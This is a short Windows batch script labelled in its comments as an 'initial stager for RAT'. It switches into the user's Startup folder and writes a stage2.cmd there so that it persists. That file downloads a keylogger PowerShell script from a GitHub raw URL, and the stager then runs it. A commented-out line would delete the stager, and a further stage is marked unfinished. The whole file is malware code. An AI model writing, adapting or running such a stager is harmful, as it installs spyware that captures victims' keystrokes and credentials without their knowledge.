@echo off
@REM initial stager for RAT

@REM varialbes
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into startup directry
cd %STARTUP%

@REM TODO: build out stage two
@REM Write payloads to startup

(
    echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/AbishekPonmudi/Keylogger/refs/heads/main/keylogger.ps1' -OutFile 'keylogger.ps1'"
) > stage2.cmd

@REM run payload
powershell ./stage2.cmd

@REM cd back into initial Location
cd "%INITIALPATH%"
@REM del initial.cmd